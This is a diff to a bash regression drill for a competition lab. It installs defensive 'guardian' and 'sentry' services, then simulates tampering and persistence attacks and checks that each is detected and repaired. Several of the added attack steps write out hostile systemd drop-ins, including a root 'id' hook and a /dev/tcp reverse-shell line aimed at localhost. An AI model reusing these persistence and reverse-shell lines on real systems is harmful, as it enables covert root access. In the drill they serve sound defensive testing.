@@ -1,8 +1,8 @@
 #!/usr/bin/env bash
 #
 # Automated regression run of playbooks/simulation-runbook.md: arm the defenses,
-# let redteam/plant.sh land, detect, eradicate, then put guardian.sh through six
-# attacks and prove --uninstall is exact. Prints PASS/FAIL per assertion.
+# let redteam/plant.sh land, detect, eradicate, then put guardian/sentry through
+# nine attacks and prove --uninstall is exact. Prints PASS/FAIL per assertion.
 #
 # LAB VM ONLY, as root. It plants real footholds and installs real persistence.
 # Snapshot first; revert after.
@@ -38,6 +38,8 @@ guardian_value() {
     cron=${CCDC_GUARDIAN_CRON_NAME:-$name}
     guardian_dir=${CCDC_GUARDIAN_DIR:-/usr/local/lib/$name}
     state_dir=${CCDC_GUARDIAN_STATE_DIR:-$evidence}
+    sentry_name=${CCDC_SENTRY_NAME:-ccdc-sentry}
+    sentry_dir=${CCDC_SENTRY_DIR:-/usr/local/lib/$sentry_name}
     watchdog_file=${CCDC_GUARDIAN_WATCHDOG_FILE:-$watch.sh}
     tick_file=${CCDC_GUARDIAN_TICK_FILE:-$ticker.sh}
     case "$2" in
@@ -52,6 +54,8 @@ guardian_value() {
       state_dir) printf "%s" "$state_dir" ;;
       watchdog_file) printf "%s" "$watchdog_file" ;;
       tick_file) printf "%s" "$tick_file" ;;
+      sentry_name) printf "%s" "$sentry_name" ;;
+      sentry_dir) printf "%s" "$sentry_dir" ;;
       *) exit 2 ;;
     esac
   ' ccdc-drill "$1" "$2"
@@ -138,6 +142,8 @@ run_self_test() {
   self_eq state_dir /tmp/custom-state
   self_eq watchdog_file custom-watch.sh
   self_eq tick_file custom-tick.sh
+  self_eq sentry_name ccdc-sentry
+  self_eq sentry_dir /usr/local/lib/ccdc-sentry
 
   # The checked-in example deliberately assigns empty strings to optional
   # overrides. `${var:-default}` must treat those as unset, just as guardian
@@ -214,15 +220,28 @@ GUARD_RECONCILE_UNIT="$GUARD_RECONCILE_NAME.service"
 GUARD_RECONCILE_TIMER="$GUARD_RECONCILE_NAME.timer"
 GUARD_WATCHDOG_PATH="$GUARD_DIR/$GUARD_WATCHDOG_FILE"
 GUARD_TICK_PATH="$GUARD_DIR/$GUARD_TICK_FILE"
+SENTRY_NAME=$(guardian_value "$CFG" sentry_name)
+SENTRY_DIR=$(guardian_value "$CFG" sentry_dir)
+SENTRY_UNIT="$SENTRY_NAME.service"
+SENTRY_UNIT_PATH="/etc/systemd/system/$SENTRY_UNIT"
 SCORE_URL=${CCDC_DRILL_SCORE_URL:-http://127.0.0.1:8080/}
 SCORED_UNIT=${CCDC_DRILL_SERVICE:-scored-web}
 RUN_ID=$(date -u '+%Y%m%dT%H%M%SZ')-$$
 DRILL_TMP=$(mktemp -d /tmp/ccdc-drill.XXXXXX) || exit 1
 monitor_pid=''
+DRILL_DROPIN_UNIT=''
 
 cleanup_drill() {
   [ -z "$monitor_pid" ] || kill "$monitor_pid" >/dev/null 2>&1 || true
   [ -z "$monitor_pid" ] || wait "$monitor_pid" 2>/dev/null || true
+  if [ -n "$DRILL_DROPIN_UNIT" ]; then
+    systemctl disable --now "$DRILL_DROPIN_UNIT" >/dev/null 2>&1 || true
+    rm -f "/etc/systemd/system/$DRILL_DROPIN_UNIT" >/dev/null 2>&1 || true
+    [ ! -d "/etc/systemd/system/$DRILL_DROPIN_UNIT.d" ] \
+      || find "/etc/systemd/system/$DRILL_DROPIN_UNIT.d" -depth -delete 2>/dev/null || true
+    systemctl reset-failed "$DRILL_DROPIN_UNIT" >/dev/null 2>&1 || true
+  fi
+  systemctl daemon-reload >/dev/null 2>&1 || true
   find "$DRILL_TMP" -depth -delete 2>/dev/null || true
 }
 trap cleanup_drill EXIT
@@ -443,8 +462,15 @@ fi
 
 # ---------------------------------------------------------------- phase 4
 hdr "PHASE 4 - guardian survival (the unproven paths)"
+./linux/sentry.sh --config "$CFG" --install --apply >"$DRILL_TMP/sinstall.out" 2>&1
+systemctl is-active --quiet "$SENTRY_UNIT" \
+  && ok "fresh sentry authority installed before guardian enrollment" \
+  || no "sentry install failed before guardian enrollment"
 ./linux/guardian.sh --config "$CFG" --install --apply >"$DRILL_TMP/ginstall.out" 2>&1
 sed 's/^/      /' "$DRILL_TMP/ginstall.out" | head -20
+grep -Fq "protected|$SENTRY_UNIT_PATH|" "$GUARD_STATE_DIR/guardian.manifest" 2>/dev/null \
+  && ok "guardian manifest independently protects the sentry unit" \
+  || no "guardian did not enroll sentry protection (check CCDC_GUARDIAN_PROTECT_SENTRY)"
 
 tampered_count() { find "$GUARD_STATE_DIR/guardian.tampered" -type f 2>/dev/null | wc -l; }
 
@@ -542,7 +568,121 @@ systemctl is-active --quiet "$GUARD_TICKER_UNIT" \
   && ok "layer 1 still active after the drop-in was stripped" \
   || no "layer 1 is down after the drop-in repair"
 
-printf '\n  -- ATTACK 6: remove ALL THREE layers inside one interval --\n'
+printf '\n  -- ATTACK 6: alter sentry while its parent loop keeps heartbeating --\n'
+sentry_pid_before=$(unit_main_pid "$SENTRY_UNIT" 2>/dev/null || printf '')
+heartbeat_before=$(stat -c '%Y' "$EV/sentry.last-pass" 2>/dev/null || printf 0)
+tampered_before=$(tampered_count)
+printf '#!/bin/bash\n# attacker stub: parent sentry loop remains alive\nexit 0\n' >"$SENTRY_DIR/triage.sh"
+printf '\n# attacker changed monitoring assumptions\n' >>"$SENTRY_DIR/sentry.env"
+printf '\n# attacker changed the trusted unit fragment\n' >>"$SENTRY_UNIT_PATH"
+systemctl daemon-reload
+sleep 1
+touch "$EV/sentry.last-pass"
+heartbeat_after=$(stat -c '%Y' "$EV/sentry.last-pass" 2>/dev/null || printf 0)
+[ "$heartbeat_after" -gt "$heartbeat_before" ] \
+  && ok "attacker kept the sentry completion heartbeat fresh" \
+  || no "heartbeat-preserving sentry attack did not reproduce the intended blind spot"
+systemctl is-active --quiet "$SENTRY_UNIT" \
+  && ok "sentry stayed active while its on-disk payload/config/unit were altered" \
+  || no "sentry unexpectedly stopped during the heartbeat-preserving attack"
+wait_s $((INT + 45))
+cmp -s "$SENTRY_DIR/triage.sh" "$GUARD_DIR/.repair/sentry/tree/triage.sh" \
+  && ok "guardian restored the sentry executable tree from its private copy" \
+  || no "tampered sentry executable survived"
+cmp -s "$SENTRY_DIR/sentry.env" "$GUARD_DIR/.repair/sentry/tree/sentry.env" \
+  && ok "guardian restored sentry config from its private copy" \
+  || no "tampered sentry config survived"
+cmp -s "$SENTRY_UNIT_PATH" "$GUARD_DIR/.repair/sentry/unit/$SENTRY_UNIT" \
+  && ok "guardian restored the sentry unit from its private copy" \
+  || no "tampered sentry unit survived"
+systemctl is-active --quiet "$SENTRY_UNIT" \
+  && ok "sentry is active after guardian repair" || no "sentry is down after guardian repair"
+sentry_pid_after=$(unit_main_pid "$SENTRY_UNIT" 2>/dev/null || printf '')
+[ -n "$sentry_pid_before" ] && [ -n "$sentry_pid_after" ] && [ "$sentry_pid_before" != "$sentry_pid_after" ] \
+  && ok "guardian restarted sentry so repaired files are the running code" \
+  || no "sentry process identity did not change after payload repair"
+[ "$(tampered_count)" -gt "$tampered_before" ] \
+  && ok "tampered sentry files were preserved as evidence" \
+  || no "sentry tamper evidence was not preserved"
+
+printf '\n  -- ATTACK 7: override sentry without touching its unit file --\n'
+sentry_dropin_dir="/etc/systemd/system/$SENTRY_UNIT.d"
+sentry_dropin_marker="$DRILL_TMP/pwned-sentry-dropin"
+mkdir -p "$sentry_dropin_dir"
+printf '[Service]\nExecStartPost=/bin/sh -c %s\n' "'id > $sentry_dropin_marker'" >"$sentry_dropin_dir/override.conf"
+systemctl daemon-reload
+wait_s $((INT + 45))
+[ -e "$sentry_dropin_dir" ] && no "sentry drop-in survived guardian reconciliation" \
+                              || ok "guardian removed the sentry drop-in override"
+[ -e "$sentry_dropin_marker" ] && no "sentry drop-in command ran as root" \
+                                || ok "sentry drop-in command never ran"
+systemctl is-active --quiet "$SENTRY_UNIT" \
+  && ok "sentry remains active after effective-unit repair" \
+  || no "sentry is down after effective-unit repair"
+
+printf '\n  -- ATTACK 8: exercise sentry unitdropin and unitdropindeep removal --\n'
+DRILL_DROPIN_UNIT="ccdc-drill-dropin-$RUN_ID.service"
+DRILL_DROPIN_UNIT_PATH="/etc/systemd/system/$DRILL_DROPIN_UNIT"
+DRILL_DROPIN_DIR="$DRILL_DROPIN_UNIT_PATH.d"
+DRILL_DROPIN="$DRILL_DROPIN_DIR/override.conf"
+DRILL_DEEP_PAYLOAD="$DRILL_TMP/dropin-payload.sh"
+cat >"$DRILL_DROPIN_UNIT_PATH" <<'UNIT'
+[Unit]
+Description=Disposable CCDC drop-in removal drill
+[Service]
+Type=oneshot
+ExecStart=/bin/true
+RemainAfterExit=yes
+UNIT
+systemctl daemon-reload
+systemctl start "$DRILL_DROPIN_UNIT"
+mkdir -p "$DRILL_DROPIN_DIR"
+printf '[Service]\nExecStartPost=/bin/sh -c %s\n' "'sh -i >& /dev/tcp/127.0.0.1/9 0>&1'" >"$DRILL_DROPIN"
+systemctl daemon-reload
+./linux/sentry.sh --config "$CFG" --once --no-bell >"$DRILL_TMP/dropin-once.out" 2>&1 || true
+./linux/sentry.sh --config "$CFG" --status >"$DRILL_TMP/dropin-status.out" 2>&1
+dropin_subject="$DRILL_DROPIN_UNIT::$DRILL_DROPIN"
+dropin_item=$(awk -F'|' -v s="$dropin_subject" '$2 == "unitdropin" && $3 == s { print NR; exit }' "$EV/sentry.reviewed")
+if [ -n "$dropin_item" ] \
+  && ./linux/sentry.sh --config "$CFG" --approve "$dropin_item" --apply >"$DRILL_TMP/dropin-approve.out" 2>&1; then
+  ok "sentry approved the exact direct drop-in finding"
+else
+  no "sentry could not approve the direct drop-in finding"
+fi
+[ ! -e "$DRILL_DROPIN" ] && ok "unitdropin action removed only the malicious drop-in" \
+                           || no "unitdropin action left the malicious drop-in"
+[ -f "$DRILL_DROPIN_UNIT_PATH" ] && systemctl is-active --quiet "$DRILL_DROPIN_UNIT" \
+  && ok "base unit survived and was restarted after direct drop-in removal" \
+  || no "base unit was damaged by direct drop-in removal"
+
+printf '#!/bin/bash\nsh -i >& /dev/tcp/127.0.0.1/9 0>&1\n' >"$DRILL_DEEP_PAYLOAD"
+chmod 0700 "$DRILL_DEEP_PAYLOAD"
+mkdir -p "$DRILL_DROPIN_DIR"
+printf '[Service]\nExecStart=\nExecStart=/bin/bash %s\n' "$DRILL_DEEP_PAYLOAD" >"$DRILL_DROPIN"
+systemctl daemon-reload
+./linux/sentry.sh --config "$CFG" --once --no-bell >"$DRILL_TMP/dropindeep-once.out" 2>&1 || true
+./linux/sentry.sh --config "$CFG" --status >"$DRILL_TMP/dropindeep-status.out" 2>&1
+dropindeep_subject="$DRILL_DROPIN_UNIT::$DRILL_DROPIN::$DRILL_DEEP_PAYLOAD"
+dropindeep_item=$(awk -F'|' -v s="$dropindeep_subject" '$2 == "unitdropindeep" && $3 == s { print NR; exit }' "$EV/sentry.reviewed")
+if [ -n "$dropindeep_item" ] \
+  && ./linux/sentry.sh --config "$CFG" --approve "$dropindeep_item" --apply >"$DRILL_TMP/dropindeep-approve.out" 2>&1; then
+  ok "sentry approved the exact deep drop-in finding"
+else
+  no "sentry could not approve the deep drop-in finding"
+fi
+[ ! -e "$DRILL_DROPIN" ] && [ ! -e "$DRILL_DEEP_PAYLOAD" ] \
+  && ok "unitdropindeep removed the drop-in and its launched payload" \
+  || no "unitdropindeep left the drop-in or launched payload"
+[ -f "$DRILL_DROPIN_UNIT_PATH" ] && systemctl is-active --quiet "$DRILL_DROPIN_UNIT" \
+  && ok "base unit survived and was restarted after deep drop-in removal" \
+  || no "base unit was damaged by deep drop-in removal"
+systemctl disable --now "$DRILL_DROPIN_UNIT" >/dev/null 2>&1 || true
+rm -f "$DRILL_DROPIN_UNIT_PATH" "$DRILL_DEEP_PAYLOAD"
+rmdir "$DRILL_DROPIN_DIR" 2>/dev/null || true
+systemctl daemon-reload
+systemctl reset-failed "$DRILL_DROPIN_UNIT" >/dev/null 2>&1 || true
+
+printf '\n  -- ATTACK 9: remove ALL THREE guardian layers inside one interval --\n'
 ticker_pid=''
 if ticker_pid=$(unit_main_pid "$GUARD_TICKER_UNIT") \
   && pid_has_payload "$ticker_pid" "$GUARD_TICK_PATH"; then
@@ -584,6 +724,12 @@ systemctl is-active --quiet "$GUARD_TICKER_UNIT" && ok "reinstall from scratch w
 
 ./linux/guardian.sh --config "$CFG" --uninstall --apply >"$DRILL_TMP/guninstall.out" 2>&1
 sed 's/^/      /' "$DRILL_TMP/guninstall.out" | tail -5
+[ -f "$SENTRY_DIR/sentry.sh" ] && [ -f "$SENTRY_UNIT_PATH" ] \
+  && ok "guardian uninstall preserved sentry-owned unit and tree" \
+  || no "guardian uninstall crossed ownership boundary and removed sentry"
+systemctl is-active --quiet "$SENTRY_UNIT" \
+  && ok "sentry remains active after guardian uninstall" \
+  || no "guardian uninstall stopped the separately owned sentry"
 leftover=0
 for p in "/etc/systemd/system/$GUARD_WATCH_UNIT" "/etc/systemd/system/$GUARD_TICKER_UNIT" \
          "/etc/systemd/system/$GUARD_RECONCILE_UNIT" "/etc/systemd/system/$GUARD_RECONCILE_TIMER" \
@@ -618,6 +764,14 @@ if [ -n "$known_units" ]; then
 else
   ok "systemd has none of the configured guardian units left"
 fi
+if ./linux/sentry.sh --config "$CFG" --uninstall --apply >"$DRILL_TMP/suninstall.out" 2>&1; then
+  ok "sentry uninstalled after its guardian was disarmed"
+else
+  no "sentry uninstall failed after guardian removal"
+fi
+[ ! -e "$SENTRY_DIR" ] && [ ! -e "$SENTRY_UNIT_PATH" ] \
+  && ok "sentry uninstall removed its own unit and tree" \
+  || no "sentry-owned artifacts survived sentry uninstall"
 scored_up && ok "scored service is still up at the end of the drill" \
           || no "scored service is down at the end of the drill"
 
